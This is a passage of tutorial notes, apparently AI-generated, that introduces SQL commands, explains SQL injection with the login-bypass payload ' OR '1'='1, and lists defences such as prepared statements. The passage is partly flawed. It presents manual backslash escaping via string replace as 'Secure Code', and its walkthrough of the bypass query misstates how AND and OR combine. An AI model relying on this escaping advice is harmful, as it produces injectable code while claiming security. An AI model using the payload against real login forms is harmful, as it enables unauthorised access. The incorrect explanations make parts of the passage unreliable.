query = f"SELECT * FROM books WHERE author = '{user_input}'"
```

The SQL query becomes:

```sql
SELECT * FROM books WHERE author = 'O'Reilly'
```

This query will break because the single quote in **O'Reilly** is treated as part of the SQL command.


#### **Example With Escaping (Secure Code):**

To prevent issues, we can **escape** the single quote:

```python
# Example with escaping
user_input = "O'Reilly".replace("'", "\\'")
query = f"SELECT * FROM books WHERE author = '{user_input}'"
```

The query now becomes:

```sql
SELECT * FROM books WHERE author = 'O\'Reilly'
```

Now, the single quote in **O'Reilly** is treated as part of the string, not part of the SQL query. This prevents the query from breaking or being manipulated.


### **Summary of Best Practices:**

- **Prepared Statements** are the best defense, as they separate SQL logic from data.
- **Input Validation** ensures the data matches the expected format, helping prevent dangerous inputs.
- **Escaping User Input** ensures special characters like `'` or `"` are treated as plain text, not SQL commands.

By combining these methods, developers can greatly reduce the risk of SQL injection attacks and ensure the integrity and security of their web applications!












-------------------
## Wrap Up




### Introduction to SQL

**SQL (Structured Query Language)** is the standard language for managing and manipulating databases. It's used to interact with databases by executing commands to retrieve, insert, update, and delete data.

Imagine a database as a big Excel sheet with rows and columns where each table holds data related to something—like customer orders, products, or employees. SQL lets you ask questions about that data, kind of like a powerful search tool.

#### Basic SQL Commands
Here are some basic SQL commands:

1. **SELECT**: Retrieve data from the database.
   - **Example**: 
     ```sql
     SELECT * FROM customers;
     ```
     This retrieves all the rows and columns from the `customers` table.

2. **INSERT**: Add new data into the database.
   - **Example**: 
     ```sql
     INSERT INTO customers (name, email) VALUES ('John Doe', 'john@example.com');
     ```

3. **UPDATE**: Modify existing data.
   - **Example**:
     ```sql
     UPDATE customers SET email = 'john.new@example.com' WHERE name = 'John Doe';
     ```

4. **DELETE**: Remove data from the database.
   - **Example**:
     ```sql
     DELETE FROM customers WHERE name = 'John Doe';
     ```

5. **WHERE Clause**: Filters data based on conditions.
   - **Example**:
     ```sql
     SELECT * FROM customers WHERE country = 'USA';
     ```

SQL can do much more, like joining multiple tables, sorting, grouping data, and performing calculations. But those are the basics!

---

### SQL Injection (SQLi)

**SQL Injection (SQLi)** is a security vulnerability that happens when user input is poorly handled, allowing attackers to "inject" malicious SQL commands into a query.

Here’s a simplified scenario to understand SQLi:

#### Example Scenario
Imagine a website with a login form where you type your username and password. Behind the scenes, the website might use SQL to check if the credentials are correct. A simple query might look like this:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '1234';
```

Now, let’s say the website doesn’t properly validate the input. If an attacker types `' OR '1'='1` as the username and leaves the password blank, the query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
```

Here’s what happens:
- The condition `'1'='1'` is **always true**.
- The query now gives access to the entire `users` table because it bypasses the actual username/password check.

#### Types of SQL Injection
1. **In-Band SQLi**: This is the most common, where attackers directly manipulate the query and receive results on the same channel.
   
2. **Blind SQLi**: The attacker sends payloads but doesn’t get immediate results. Instead, they have to infer whether the attack succeeded based on different responses from the application (like time delays or error messages).

3. **Out-of-Band SQLi**: This is rare and occurs when the attacker sends malicious data and expects results over a different communication channel (like via email or another service).

---

### Preventing SQL Injection

1. **Prepared Statements/Parameterized Queries**: Always use prepared statements where user inputs are separated from the query structure, making it impossible to inject malicious code.

   - **Example (in PHP)**:
     ```php
     $stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');
     $stmt->execute(['username' => $input_username]);
     ```

2. **Input Validation**: Always validate and sanitize user inputs to ensure they match expected patterns (like no special characters for username or password fields).

3. **Least Privilege**: Ensure the database user account your application uses has only the necessary permissions. If it doesn’t need to modify data, don’t give it `INSERT` or `UPDATE` access.

4. **Use Web Application Firewalls (WAFs)**: WAFs can help detect and block SQL injection attacks in real-time.

---

### Summary

- **SQL** is a powerful language for managing databases with commands like `SELECT`, `INSERT`, `UPDATE`, and `DELETE`.
- **SQL Injection (SQLi)** happens when malicious users exploit poorly handled input to run unwanted SQL commands, potentially compromising the whole database.
- To prevent SQLi: use **prepared statements**, **validate input**, and practice the principle of **least privilege**.

Would you like to try an interactive SQL example, or dive deeper into preventing SQLi in specific programming languages?





